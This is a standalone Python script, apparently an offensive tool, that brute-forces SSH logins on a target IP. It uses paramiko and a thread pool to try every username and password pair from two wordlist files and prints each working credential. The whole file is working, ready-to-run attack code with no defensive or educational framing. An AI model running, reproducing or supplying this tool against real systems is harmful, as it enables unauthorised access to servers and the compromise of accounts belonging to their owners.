import paramiko
import sys
import threading
import queue

# Function to attempt SSH login
def ssh_login(ip, username, password, port=22):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"[+] Login successful: {username}:{password}")
        ssh.close()
        return True
    except paramiko.ssh_exception.SSHException as e:
        # Suppress "Error reading SSH protocol banner" messages
        if "Error reading SSH protocol banner" not in str(e):
            print(f"[-] Failed: {username}:{password} (SSH Error: {e})")
        return False
    except Exception as e:
        print(f"[-] Failed: {username}:{password} (Error: {e})")
        return False

# Function to handle brute force with threading
def brute_force(ip, usernames, passwords, threads):
    q = queue.Queue()

    # Add all username:password combinations to the queue
    for username in usernames:
        for password in passwords:
            q.put((username, password))

    # Worker function for threads
    def worker():
        while not q.empty():
            username, password = q.get()
            ssh_login(ip, username, password)
            q.task_done()

    # Create and start threads
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()

    # Wait for all threads to finish
    q.join()

# Main function
def main():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <target_ip> <usernames_file> <passwords_file> <threads>")
        sys.exit(1)

    ip = sys.argv[1]
    usernames_file = sys.argv[2]
    passwords_file = sys.argv[3]
    threads = int(sys.argv[4])

    # Read usernames and passwords from files
    try:
        with open(usernames_file, 'r') as f:
            usernames = [line.strip() for line in f]

        with open(passwords_file, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

    # Start brute force
    print("[*] Starting brute force attack...")
    brute_force(ip, usernames, passwords, threads)
    print("[*] Brute force attack completed.")

# Entry point
if __name__ == "__main__":
    main()
